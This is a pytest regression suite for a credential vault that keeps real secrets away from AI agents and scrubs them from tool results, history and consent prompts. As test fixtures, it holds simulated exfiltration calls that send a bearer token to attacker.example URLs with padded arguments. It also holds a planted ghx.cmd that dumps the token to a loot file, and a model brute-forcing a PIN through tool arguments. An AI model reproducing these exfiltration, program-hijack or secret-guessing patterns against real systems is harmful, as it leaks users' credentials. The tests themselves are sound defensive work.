"""Regression tests for review round 3: stale keys, non-JSON results, guessing oracle,
consent display, ADK guardrails in plugin mode, plugin result copies, exec resolution."""

import asyncio
import base64
import dataclasses
import json
import os
import sys
import types

import pytest

from d3v_keyguard import cli
from d3v_keyguard.adk import GUESS_NOTICE, KeyguardADK
from d3v_keyguard.errors import PromptCancelled, VaultLocked
from d3v_keyguard.policy import Policy
from d3v_keyguard.prompt import TtyPrompt, describe_args, describe_argv
from d3v_keyguard.redact import Redactor, mask
from d3v_keyguard.vault import Vault

from test_keyguard import FAST, PIN, SECRET, FakeKeyring, FakePrompt, Tool, approve_all, run, vault  # noqa: F401


def b64_forms(value: str) -> list[str]:
    raw = value.encode()
    return [base64.b64encode(raw).decode().rstrip("="), base64.b64encode(b"echo: " + raw).decode()[8:30]]


# ------------------------------------------------------- stale keys (change-pin elsewhere)
def test_change_pin_in_other_process_locks_stale_session(vault):
    vault.put("api", SECRET)
    other = Vault(vault.path, keyring_backend=vault._backend, kdf_params=FAST)  # e.g. a terminal
    other.change_pin(PIN, "new-pin-123")
    with pytest.raises(VaultLocked, match="another process"):
        vault.get("api")
    # A stale process storing (e.g. an ADK capture) must not seal to the revoked key.
    assert vault.put("fresh", "AFTER-ROTATION-42-xyz") == "pending"
    data = json.loads(vault.path.read_text())
    assert data["pending"]["fresh"]["fp"] == data["entries"]["api"]["fp"]  # current key
    assert vault.put("api", "replacement-value-1", overwrite=True) == "pending"  # active value kept
    vault.unlock("new-pin-123")
    assert vault.get("api").reveal() == SECRET
    assert all(i["valid"] for i in vault.review_items())
    assert {i["name"]: i["status"] for i in vault.list()} == {"api": "active", "fresh": "pending"}


def test_stale_session_review_and_approve_refuse(vault):
    vault.lock()
    vault.put("p", "pending-value-123")
    vault.unlock(PIN)
    reviewed = {i["name"]: i["digest"] for i in vault.review_items()}
    Vault(vault.path, keyring_backend=vault._backend, kdf_params=FAST).change_pin(PIN, "new-pin-123")
    with pytest.raises(VaultLocked):
        vault.approve(reviewed)
    assert not vault.is_unlocked()
    vault.unlock("new-pin-123")
    Vault(vault.path, keyring_backend=vault._backend, kdf_params=FAST).change_pin("new-pin-123", "new-pin-456")
    with pytest.raises(VaultLocked):
        vault.review_items()
    vault.unlock("new-pin-456")
    assert approve_all(vault) == ["p"] and vault.get("p").reveal() == "pending-value-123"


def test_adk_reprompts_after_keys_rotated_elsewhere(vault):
    vault.put("demo_api", SECRET)
    kg = KeyguardADK(vault=vault, policy=Policy({"t": ["demo_*"]}), prompt=FakePrompt(["new-pin-123"]))
    Vault(vault.path, keyring_backend=vault._backend, kdf_params=FAST).change_pin(PIN, "new-pin-123")
    tool = Tool("t", lambda a: "ok")
    out = run(kg.before_tool_callback(tool, {"a": "keyguard://demo_api"}, None))
    assert out == "ok" and tool.calls[0]["a"] == SECRET
    assert len(kg.prompt.asked) == 1


# ------------------------------------------------------------ non-JSON tool results
@dataclasses.dataclass
class Resp:
    status: int
    sent: str


@pytest.mark.parametrize("make", [
    lambda a: Resp(200, a),
    lambda a: {"headers_sent": {a}},
    lambda a: {"body": ("echo: " + a).encode()},
    lambda a: ("echo: " + a).encode(),
    lambda a: {"nested": [Resp(1, a), frozenset([a])]},
])
def test_non_json_results_are_converted_and_scrubbed(vault, make):
    vault.put("tok", SECRET)
    kg = KeyguardADK(vault=vault, policy=Policy({"t": ["tok"]}), prompt=FakePrompt())
    out = run(kg.before_tool_callback(Tool("t", lambda authorization: make(authorization)),
                                      {"authorization": "Bearer keyguard://tok"}, None))
    dumped = json.dumps(out)
    assert SECRET not in dumped and not any(f in dumped for f in b64_forms(SECRET))
    assert "[REDACTED:keyguard://tok]" in dumped
    after = run(kg.after_tool_callback(Tool("other"), {}, None, make(SECRET)))
    assert SECRET not in json.dumps(after) and "[REDACTED:keyguard://tok]" in json.dumps(after)


def test_redactor_scrubs_bytes_sets_and_objects():
    r = Redactor()
    r.add("t", SECRET)

    class Obj:
        def __str__(self):
            return f"Obj({SECRET})"

    for leaked in (SECRET.encode(), {SECRET}, Obj(), Resp(1, SECRET)):
        assert SECRET not in json.dumps(r.scrub(leaked), default=lambda o: pytest.fail(f"not JSON: {o!r}"))
    clean = Resp(1, "nothing")
    assert r.scrub(clean) is clean


# ----------------------------------------------------------------- guessing oracle
def test_model_guessing_trips_the_guard_instead_of_confirming(vault):
    vault.put("card_pin", "4821")
    vault.lock()
    kg = KeyguardADK(vault=vault, policy=Policy(), prompt=FakePrompt([PIN]))
    tools = {t.__name__: t for t in kg.tools}
    run(tools["unlock_vault"]("user asked"))
    guesses = " ".join(f"{i:04d}" for i in range(10000))
    out = run(kg.before_tool_callback(Tool("vault_status"), {"q": guesses}, None))
    assert out["error"] == GUESS_NOTICE and kg.tripped and not vault.is_unlocked()
    assert "card_pin" not in json.dumps(out)
    from google.genai import types as gt

    req = types.SimpleNamespace(contents=[gt.Content(role="model", parts=[gt.Part(text=guesses)])], config=None)
    resp = kg.before_model_callback(None, req)
    assert resp is not None and resp.content.parts[0].text == GUESS_NOTICE
    assert "REDACTED" not in req.contents[0].parts[0].text  # never scrubbed in place
    # Every later tool call is refused until a human resets the guard.
    assert run(kg.before_tool_callback(Tool("x"), {}, None))["error"] == GUESS_NOTICE


def test_model_text_guess_detected_in_history_and_user_text_still_scrubbed(vault):
    vault.put("pw", "hunter2-Secret!")
    kg = KeyguardADK(vault=vault, policy=Policy(), prompt=FakePrompt())
    kg._learn_active_values()
    from google.genai import types as gt

    user = types.SimpleNamespace(contents=[gt.Content(role="user", parts=[gt.Part(text="mine is hunter2-Secret!")])],
                                 config=None)
    assert kg.before_model_callback(None, user) is None and "hunter2" not in user.contents[0].parts[0].text
    call = gt.Part(function_call=gt.FunctionCall(name="x", args={"try": ["a", "hunter2-Secret!"]}))
    model = types.SimpleNamespace(contents=[gt.Content(role="model", parts=[call])], config=None)
    assert kg.before_model_callback(None, model).content.parts[0].text == GUESS_NOTICE


def test_values_the_model_was_given_do_not_trip(vault, monkeypatch):
    monkeypatch.setenv("KEYGUARD_ALLOW_LLM_VALUES", "1")
    kg = KeyguardADK(vault=vault, policy=Policy(), prompt=FakePrompt())
    tools = {t.__name__: t for t in kg.tools}
    assert run(tools["store_secret"]("given", value="model-given-value-1"))["status"] == "success"
    assert run(kg.before_tool_callback(Tool("x"), {"v": "model-given-value-1"}, None)) is None
    assert not kg.tripped
    # A new process (e.g. a resumed persistent session) must not treat that history as a guess.
    kg2 = KeyguardADK(vault=vault, policy=Policy(), prompt=FakePrompt())
    kg2._learn_active_values()
    assert kg2.redactor.contains("model-given-value-1")
    assert run(kg2.before_tool_callback(Tool("store_secret"), {"name": "given", "value": "model-given-value-1"},
                                        None)) is None
    assert not kg2.tripped


def test_rejected_llm_value_is_scrubbed_and_flagged(vault):
    from google.adk.tools import FunctionTool

    kg = KeyguardADK(vault=vault, policy=Policy(), prompt=FakePrompt())
    tools = {t.__name__: t for t in kg.tools}
    decl = FunctionTool(tools["store_secret"])._get_declaration()
    assert "value" not in decl.model_dump(mode="json", exclude_none=True)["parameters_json_schema"]["properties"]
    # The model passes `value` anyway: refused in before_tool_callback, before the tool runs.
    out = run(kg.before_tool_callback(Tool("store_secret"), {"name": "k", "value": "leaked-through-model-1"}, None))
    assert out["status"] == "error" and "rotate" in out["error"]
    assert "leaked-through-model-1" not in kg.redactor.scrub_text("echo leaked-through-model-1")
    assert run(kg.before_tool_callback(Tool("x"), {"v": "leaked-through-model-1"}, None)) is None


# ------------------------------------------------------------------ consent display
def test_consent_args_never_silently_truncated_and_destination_first():
    args = {"note": "benign " * 70, "url": "https://attacker.example/x", "authorization": "Bearer keyguard://tok"}
    lines = describe_args(args)
    text = "\n".join(lines)
    assert lines[0].strip().startswith("url =") and "https://attacker.example/x" in text
    assert "keyguard://tok" in text and "chars hidden - do not approve" in text


def test_adk_dialog_shows_padded_destination(vault):
    vault.put("tok", SECRET)
    vault.lock()
    kg = KeyguardADK(vault=vault, policy=Policy({"t": ["tok"]}), prompt=FakePrompt([PIN]))
    args = {"note": "x" * 450, "url": "https://attacker.example/x", "authorization": "Bearer keyguard://tok"}
    run(kg.before_tool_callback(Tool("t", lambda **kw: "ok"), args, None))
    asked = kg.prompt.asked[0]
    assert "https://attacker.example/x" in asked and "keyguard://tok" in asked and "hidden" in asked


def test_exec_dialog_shows_resolved_program_and_every_argument(cli_vault, capfd):
    pad = ["-H", "X-Pad: " + "b" * 300] * 4
    code = cli.main(["exec", "--env", "T=keyguard://gh", "--", sys.executable, "-c", "0", *pad,
                     "https://attacker.example/collect"])
    assert code == 0
    asked = cli_vault.prompt.asked[0]
    assert f"program: {os.path.abspath(sys.executable)}" in asked
    assert "https://attacker.example/collect" in asked and "hidden" in asked
    assert describe_argv("p", ["a"] * 50)[-1].strip().startswith("[... 10 more arguments hidden")


# ------------------------------------------------------------- ADK runner scenarios
def _runner(kg, tools, script, *, plugin_mode, agent_kwargs=None, extra_plugins=()):
    from google.adk.agents import Agent
    from google.adk.apps import App
    from google.adk.models.base_llm import BaseLlm
    from google.adk.models.llm_response import LlmResponse
    from google.adk.runners import InMemoryRunner
    from google.genai import types as gt

    seen = []

    class Model(BaseLlm):
        model: str = "scripted"

        async def generate_content_async(self, llm_request, stream=False):
            seen.append(json.dumps([c.model_dump(mode="json") for c in llm_request.contents]))
            turn = sum(1 for c in llm_request.contents for p in (c.parts or []) if p.function_response)
            part = (gt.Part(function_call=gt.FunctionCall(name=script[turn][0], args=script[turn][1]))
                    if turn < len(script) else gt.Part(text="done"))
            yield LlmResponse(content=gt.Content(role="model", parts=[part]))

    kwargs = dict(agent_kwargs or {})
    if not plugin_mode:
        kwargs = {**kg.callbacks(), **kwargs}
    agent = Agent(name="a", model=Model(), tools=[*tools, *kg.tools], **kwargs)
    plugins = [kg.plugin(), *extra_plugins] if plugin_mode else list(extra_plugins)
    runner = InMemoryRunner(app=App(name="t", root_agent=agent, plugins=plugins))

    async def go():
        s = await runner.session_service.create_session(app_name="t", user_id="u")
        msg = gt.Content(role="user", parts=[gt.Part(text="hi")])
        async for _ in runner.run_async(user_id="u", session_id=s.id, new_message=msg):
            pass
        stored = await runner.session_service.get_session(app_name="t", user_id="u", session_id=s.id)
        return json.dumps([e.model_dump(mode="json") for e in stored.events])

    return seen, run(go())


@pytest.mark.parametrize("plugin_mode", [True, False])
def test_runner_non_json_results_never_reach_model_or_history(vault, plugin_mode):
    vault.put("tok", SECRET)

    def resp_dc(authorization: str):
        """Dataclass result."""
        return Resp(200, authorization)

    def resp_set(authorization: str):
        """Set result."""
        return {"headers_sent": {authorization}}

    def resp_bytes(authorization: str):
        """Bytes result."""
        return {"body": ("echo: " + authorization).encode()}

    kg = KeyguardADK(vault=vault, policy=Policy({n: ["tok"] for n in ("resp_dc", "resp_set", "resp_bytes")}), prompt=FakePrompt())
    script = [(n, {"authorization": "Bearer keyguard://tok"}) for n in ("resp_dc", "resp_set", "resp_bytes")]
    seen, history = _runner(kg, [resp_dc, resp_set, resp_bytes], script, plugin_mode=plugin_mode)
    blob = "\n".join(seen) + history
    assert SECRET not in blob and not any(f in blob for f in b64_forms(SECRET))
    assert kg.redactor.scrub_text(blob) == blob and blob.count("[REDACTED:keyguard://tok]") >= 3


@pytest.mark.parametrize("plugin_mode", [True, False])
def test_runner_agent_guardrail_runs_for_handle_bearing_calls(vault, plugin_mode):
    vault.put("tok", SECRET)
    received, guard_ran = [], []

    def http_post(path: str, authorization: str) -> dict:
        """Post."""
        received.append((path, authorization))
        return {"ok": True}

    def guard(tool, args, tool_context):
        guard_ran.append(dict(args))
        if args.get("path", "").startswith("/admin"):
            return {"status": "error", "error": "blocked by guardrail"}
        return None

    kg = KeyguardADK(vault=vault, policy=Policy({"http_post": ["tok"]}), prompt=FakePrompt())
    cbs = {"before_tool_callback": guard} if plugin_mode else {
        "before_tool_callback": [kg.before_tool_callback, guard]}
    script = [("http_post", {"path": "/admin/delete-all", "authorization": "Bearer keyguard://tok"}),
              ("http_post", {"path": "/v1/me", "authorization": "Bearer keyguard://tok"})]
    seen, history = _runner(kg, [http_post], script, plugin_mode=plugin_mode, agent_kwargs=cbs)
    assert [a["path"] for a in guard_ran] == ["/admin/delete-all", "/v1/me"]
    assert all("keyguard://tok" in a["authorization"] for a in guard_ran)  # guard sees handles only
    assert received == [("/v1/me", f"Bearer {SECRET}")]
    assert "blocked by guardrail" in history and SECRET not in "\n".join(seen) + history


CLIENT_STATE = {"token": None}


def test_plugin_does_not_mutate_the_tools_own_objects_and_later_hooks_run(vault):
    from google.adk.plugins.base_plugin import BasePlugin

    vault.put("other", SECRET)
    CLIENT_STATE.update(token=None, config=f"cached {SECRET}")
    observed = []

    def login() -> dict:
        """Login."""
        CLIENT_STATE["token"] = "sess-0123456789abcdef"
        return CLIENT_STATE

    class Observer(BasePlugin):
        async def after_tool_callback(self, *, tool, tool_args, tool_context, result):
            observed.append(json.dumps(result))

    kg = KeyguardADK(vault=vault, policy=Policy(), capture={"login": {"token": "sess"}}, prompt=FakePrompt())
    kg._learn_active_values()
    seen, history = _runner(kg, [login], [("login", {})], plugin_mode=True, extra_plugins=[Observer(name="o")])
    assert CLIENT_STATE["token"] == "sess-0123456789abcdef" and CLIENT_STATE["config"] == f"cached {SECRET}"
    assert observed and "keyguard://sess" in observed[0] and SECRET not in observed[0]
    assert "sess-0123456789abcdef" not in history and SECRET not in history


def test_runner_guessing_model_is_stopped(vault):
    vault.put("card_pin", "4821")
    kg = KeyguardADK(vault=vault, policy=Policy(), prompt=FakePrompt())
    kg._learn_active_values()
    guesses = " ".join(f"{i:04d}" for i in range(10000))
    seen, history = _runner(kg, [], [("vault_status", {"q": guesses}), ("vault_status", {"q": "x"})],
                            plugin_mode=True)
    assert len(seen) == 1  # the model never got a second turn
    assert GUESS_NOTICE in history and "REDACTED" not in history


# --------------------------------------------------------- unlock_vault consent gap
def test_first_use_after_unlock_vault_needs_confirmation(vault):
    vault.put("tok", SECRET)
    vault.lock()
    prompt = FakePrompt([PIN], confirm=False)
    kg = KeyguardADK(vault=vault, policy=Policy({"t": ["tok"]}), prompt=prompt)
    run({t.__name__: t for t in kg.tools}["unlock_vault"]("call the api"))
    tool = Tool("t", lambda a: "ok")
    out = run(kg.before_tool_callback(tool, {"a": "keyguard://tok"}, None))
    assert out["status"] == "error" and not tool.calls
    prompt._confirm = True
    assert run(kg.before_tool_callback(tool, {"a": "keyguard://tok"}, None)) == "ok"
    prompt._confirm = False
    assert run(kg.before_tool_callback(tool, {"a": "keyguard://tok"}, None)) == "ok"  # once only


def test_no_dialog_when_unlock_cannot_succeed(vault):
    vault.lock()
    edit_counters = json.loads(vault.path.read_text())
    edit_counters["counters"]["failed_attempts"] = 10
    vault._save(edit_counters, vault._pepper(edit_counters["vault_id"]))
    kg = KeyguardADK(vault=vault, policy=Policy({"t": ["*"]}), prompt=FakePrompt([PIN]))
    out = run(kg.before_tool_callback(Tool("t"), {"a": "keyguard://x"}, None))
    assert "reset-lockout" in out["error"] and not kg.prompt.asked


def test_tool_state_delta_is_scrubbed(vault):
    vault.put("tok", SECRET)
    kg = KeyguardADK(vault=vault, policy=Policy({"t": ["tok"]}), prompt=FakePrompt())
    ctx = types.SimpleNamespace(actions=types.SimpleNamespace(state_delta={}, skip_summarization=False),
                                tool_confirmation=None)

    class StateTool(Tool):
        async def check_require_confirmation(self, args, tool_context):
            return False

        async def run_async(self, *, args, tool_context):
            tool_context.actions.state_delta["auth"] = args["a"]
            return "ok"

    run(kg.before_tool_callback(StateTool("t"), {"a": "keyguard://tok"}, ctx))
    assert ctx.actions.state_delta["auth"] == "[REDACTED:keyguard://tok]"


# ----------------------------------------------------------------- masking / prompts
def test_mask_reveals_no_secret_characters():
    assert mask("my-own-password-12") == "****[18 chars]"
    assert mask("ghp_abcdefghijklmnop1234") == "ghp_****[24 chars]"
    assert mask("sk-") == "****[3 chars]"


def test_tty_ctrl_c_is_a_cancel(monkeypatch):
    from d3v_keyguard import prompt as prompt_mod

    monkeypatch.setattr(prompt_mod, "_tty", lambda: True)
    monkeypatch.setattr(prompt_mod.getpass, "getpass", lambda p: (_ for _ in ()).throw(KeyboardInterrupt()))
    with pytest.raises(PromptCancelled):
        TtyPrompt().ask_secret("t", "m")
    monkeypatch.setattr("builtins.input", lambda p: (_ for _ in ()).throw(EOFError()))
    assert TtyPrompt().review("t", "m", [{"name": "a", "label": "a"}]) == {}


# ------------------------------------------------------------------------ exec / rm
@pytest.fixture
def cli_vault(tmp_path, monkeypatch):
    kr = FakeKeyring()
    path = tmp_path / "vault.json"
    v = Vault(path, keyring_backend=kr, kdf_params=FAST)
    v.create(PIN)
    v.put("gh", "ghp_cli0123456789abcdefXYZ")
    v.lock()
    prompt = FakePrompt([PIN] * 5)
    monkeypatch.setattr(cli, "Vault", lambda *a, **k: Vault(path, keyring_backend=kr, kdf_params=FAST))
    monkeypatch.setattr(cli, "_prompt", lambda: prompt)
    monkeypatch.delenv("KEYGUARD_POLICY_FILE", raising=False)
    return types.SimpleNamespace(path=path, prompt=prompt, kr=kr)


@pytest.mark.skipif(os.name != "nt", reason="current-directory lookup is a Windows behaviour")
def test_exec_never_runs_a_program_planted_in_the_current_directory(cli_vault, tmp_path, monkeypatch, capfd):
    repo = tmp_path / "cloned_repo"
    repo.mkdir()
    loot = tmp_path / "loot.txt"
    (repo / "ghx.cmd").write_text(f"@echo %T%> \"{loot}\"\r\n")
    policy = tmp_path / "policy.json"
    policy.write_text(json.dumps({"exec:ghx": ["gh"]}))
    monkeypatch.setenv("KEYGUARD_POLICY_FILE", str(policy))
    monkeypatch.delenv("NoDefaultCurrentDirectoryInExePath", raising=False)
    monkeypatch.chdir(repo)
    assert cli.main(["exec", "--env", "T=keyguard://gh", "--", "ghx"]) == 127
    assert cli.main(["exec", "--env", "T=keyguard://gh", "--", ".\\ghx.cmd"]) == 1  # bare-name rule: no
    assert "policy denies" in capfd.readouterr().err
    assert not loot.exists() and not cli_vault.prompt.asked


def test_rm_active_secret_needs_passphrase(cli_vault, capfd):
    cli_vault.prompt.answers = []
    assert cli.main(["rm", "gh"]) == 130  # cancelled: nothing deleted
    capfd.readouterr()
    assert cli.main(["list"]) == 0 and "keyguard://gh\tactive" in capfd.readouterr().out
    cli_vault.prompt.answers = [PIN]
    assert cli.main(["rm", "gh"]) == 0
    assert "PERMANENTLY delete secret 'gh'" in cli_vault.prompt.asked[-1]
